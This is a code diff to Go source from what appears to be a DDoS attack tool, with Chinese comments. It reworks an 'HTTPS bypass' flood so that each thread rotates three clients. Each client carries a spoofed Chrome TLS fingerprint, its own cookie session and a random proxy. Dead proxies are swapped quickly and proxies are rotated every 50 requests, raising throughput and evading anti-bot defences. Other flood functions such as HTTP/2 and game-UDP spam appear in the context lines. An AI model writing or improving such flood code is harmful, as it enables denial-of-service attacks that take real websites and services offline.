@@ -1643,6 +1643,11 @@ func StartHTTP2FloodEx(cfg AttackConfig) *AttackSession {
 	return s
 }
 
+// bypassClientsPerThread https_bypass 每线程并发客户端数：
+// 每个客户端一条 keep-alive 连接（独立代理 + 独立 cookie 会话），
+// 轮换使用等效并行——吞吐 = Threads × 3，且各会话的 cookie 互不污染。
+const bypassClientsPerThread = 3
+
 func StartHTTPSBypass(target string, duration int, threads int) *AttackSession {
 	return StartHTTPSBypassEx(AttackConfig{
 		Target: target, Duration: duration, Threads: threads,
@@ -1672,15 +1677,26 @@ func StartHTTPSBypassEx(cfg AttackConfig) *AttackSession {
 			wg.Add(1)
 			go func(seed int) {
 				defer wg.Done()
-				endTime := time.Now().Add(dur)
 				var targetIdx uint64
 				tc := newTimeCache()
+				endTime := time.Now().Add(dur)
 				rng := NewFastRNG(time.Now().UnixNano() + int64(seed))
 
-				client := newProxyHTTPClient()
-				failStreak := 0
-				iter := 0
+				// 每线程 bypassClientsPerThread 个客户端轮换：
+				// uTLS Chrome 指纹 + 独立 cookie jar（代理切换时整体更换）
+				clients := make([]*http.Client, bypassClientsPerThread)
+				failStreak := make([]int, bypassClientsPerThread)
+				iter := make([]int, bypassClientsPerThread)
+				refreshClient := func(ci int) {
+					clients[ci] = newBypassClient(randomProxy())
+					failStreak[ci] = 0
+					iter[ci] = 0
+				}
+				for ci := 0; ci < bypassClientsPerThread; ci++ {
+					refreshClient(ci)
+				}
 
+				ci := 0
 				for tc.since(endTime) < 0 {
 					select {
 					case <-s.StopChan:
@@ -1701,38 +1717,38 @@ func StartHTTPSBypassEx(cfg AttackConfig) *AttackSession {
 						continue
 					}
 
-					// 死代理即时切换：连续 3 次失败立即换代理（此前要等 20 次
-					// 请求才轮换，死代理期间全部白打）
-					if failStreak >= 3 {
-						client.CloseIdleConnections()
-						client = newProxyHTTPClient()
-						failStreak = 0
-						iter = 0
+					client := clients[ci]
+					// 死代理即时切换：连续 3 次失败立即换新代理+新 cookie 会话
+					if failStreak[ci] >= 3 {
+						refreshClient(ci)
+						client = clients[ci]
 					}
 					// 主动轮换：每 50 次请求换一个代理（IP 多样性）
-					if iter >= 50 {
-						client.CloseIdleConnections()
-						client = newProxyHTTPClient()
-						iter = 0
+					iter[ci]++
+					if iter[ci] >= 50 {
+						refreshClient(ci)
+						client = clients[ci]
 					}
-					iter++
 
-					// 随机特征请求（UA/路径轮换）
-					req := buildL7Request("GET", tgt, nil, rng)
+					// 随机特征请求（Chrome 头 + UA 轮换）
+					req := buildBypassRequest(tgt, rng)
 					reqBytes := estimateRequestBytes("GET", req.URL.String(), nil, req.Header.Get("User-Agent"))
 
 					resp, err := client.Do(req)
 					if err != nil {
-						failStreak++
+						failStreak[ci]++
 						atomic.AddUint64(&s.Stats.Errors, 1)
 						continue
 					}
-					failStreak = 0
+					failStreak[ci] = 0
 					resp.Body.Close()
 					atomic.AddUint64(&s.Stats.PacketsSent, 1)
 					// 统计修正：按实际请求字节计
 					atomic.AddUint64(&s.Stats.BytesSent, uint64(reqBytes))
 					tc.refresh()
+
+					// 轮换到下一个客户端（并行 keep-alive 连接，吞吐 ×3）
+					ci = (ci + 1) % bypassClientsPerThread
 				}
 			}(i)
 		}
@@ -1749,6 +1765,16 @@ func StartHTTPSBypassEx(cfg AttackConfig) *AttackSession {
 	}()
 
 	return s
+}
+
+// randomProxy 从代理池随机取一个（空池返回 "" = 直连）
+func randomProxy() string {
+	proxyLock.RLock()
+	defer proxyLock.RUnlock()
+	if len(proxies) == 0 {
+		return ""
+	}
+	return proxies[rand.Intn(len(proxies))]
 }
 
 func StartGameUDPSpam(target string, duration int, packetSize int, threads int, prefix []byte) *AttackSession {
